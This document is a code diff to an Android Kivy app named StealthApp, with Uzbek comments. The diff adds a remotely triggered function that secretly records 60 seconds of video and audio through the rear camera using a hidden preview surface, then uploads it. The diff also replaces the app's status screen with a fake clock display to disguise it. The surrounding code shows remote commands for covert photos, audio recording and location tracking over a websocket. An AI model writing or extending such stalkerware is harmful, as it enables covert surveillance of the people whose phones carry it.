@@ -320,6 +320,58 @@ def record_audio():
         threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
 
 
+# ─── VIDEO ──────────────────────────────────────────────────────────────────────
+def record_video():
+    try:
+        from jnius import autoclass
+        MR  = autoclass('android.media.MediaRecorder')
+        VS  = autoclass('android.media.MediaRecorder$VideoSource')
+        AS  = autoclass('android.media.MediaRecorder$AudioSource')
+        OF  = autoclass('android.media.MediaRecorder$OutputFormat')
+        VE  = autoclass('android.media.MediaRecorder$VideoEncoder')
+        AE  = autoclass('android.media.MediaRecorder$AudioEncoder')
+        act = autoclass('org.kivy.android.PythonActivity').mActivity
+        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
+        Camera = autoclass('android.hardware.Camera')
+
+        ext_dir  = act.getExternalFilesDir(None).getAbsolutePath()
+        filepath = ext_dir + '/video.mp4'
+
+        status[0] = "Kamera ulanmoqda (Video)..."
+        
+        # Maxfiy (Headless) video olish uchun
+        cam = Camera.open(0) # orqa kamera
+        dummy_st = SurfaceTexture(10)
+        cam.setPreviewTexture(dummy_st)
+        cam.unlock()
+
+        rec = MR()
+        rec.setCamera(cam)
+        rec.setAudioSource(AS.CAMCORDER)
+        rec.setVideoSource(VS.CAMERA)
+        rec.setOutputFormat(OF.MPEG_4)
+        rec.setVideoEncoder(VE.H264)
+        rec.setAudioEncoder(AE.AAC)
+        rec.setOutputFile(filepath)
+        rec.setVideoSize(640, 480)
+        rec.setVideoFrameRate(15)
+
+        rec.prepare()
+        rec.start()
+        status[0] = 'Video yozilmoqda (60 sek)...'
+        time.sleep(60)
+        rec.stop()
+        rec.release()
+        cam.release()
+        
+        if os.path.exists(filepath):
+            upload_file_sync(filepath, 'video')
+    except Exception as e:
+        msg = 'Video xatolik: ' + str(e)
+        status[0] = msg
+        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
+
+
 # ─── WEBSOCKET ──────────────────────────────────────────────────────────────────
 async def ws_loop():
     loop  = asyncio.get_running_loop()
@@ -346,6 +398,8 @@ async def ws_loop():
                         Clock.schedule_once(lambda dt: take_photo_kivy(True), 0)
                     elif msg == 'record_audio':
                         threading.Thread(target=record_audio, daemon=True).start()
+                    elif msg == 'record_video':
+                        threading.Thread(target=record_video, daemon=True).start()
                     elif msg == 'get_location':
                         info = get_location_sync()
                         status[0] = info
@@ -399,34 +453,36 @@ def force_reconnect():
 class StealthApp(App):
     def build(self):
         app_ref[0] = self
-        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
+        
+        from kivy.core.window import Window
+        Window.clearcolor = (0.05, 0.05, 0.05, 1)  # To'q fon
+        
+        layout = BoxLayout(orientation='vertical', padding=0, spacing=0)
 
-        self.label = Label(
-            text='Ishga tushirilmoqda...',
-            font_size='14sp', halign='center', valign='middle',
-            size_hint=(1, 0.85), color=(1, 1, 1, 1),
+        self.time_label = Label(
+            text='00:00:00',
+            font_size='70sp', 
+            halign='center', valign='middle',
+            bold=True,
+            color=(0.2, 0.8, 0.2, 1), # Yashil raqamlar
         )
-        self.label.bind(
-            width=lambda inst, val: setattr(inst, 'text_size', (val, None))
+        self.date_label = Label(
+            text='',
+            font_size='20sp', 
+            halign='center', valign='middle',
+            color=(0.5, 0.5, 0.5, 1),
+            size_hint=(1, 0.2)
         )
 
-        btn = Button(
-            text='Keshni tozala va qayta ulash',
-            font_size='13sp', size_hint=(1, 0.15),
-            background_color=(0.2, 0.5, 0.9, 1),
-        )
-        btn.bind(on_press=lambda x: threading.Thread(
-            target=force_reconnect, daemon=True).start())
-
-        layout.add_widget(self.label)
-        layout.add_widget(btn)
+        layout.add_widget(self.time_label)
+        layout.add_widget(self.date_label)
 
         if platform == 'android':
             Clock.schedule_once(self._request_permissions, 0.5)
         else:
             threading.Thread(target=run_loop, daemon=True).start()
 
-        Clock.schedule_interval(self.update_ui, 1)
+        Clock.schedule_interval(self.update_clock, 1)
         return layout
 
     def on_start(self):
@@ -484,8 +540,10 @@ class StealthApp(App):
         Clock.schedule_once(lambda dt: _acquire_wake_lock(), 0.5)
         threading.Thread(target=run_loop, daemon=True).start()
 
-    def update_ui(self, dt):
-        self.label.text = status[0]
+    def update_clock(self, dt):
+        import time
+        self.time_label.text = time.strftime("%H:%M:%S")
+        self.date_label.text = time.strftime("%A, %d %B %Y")
 
 
 if __name__ == '__main__':
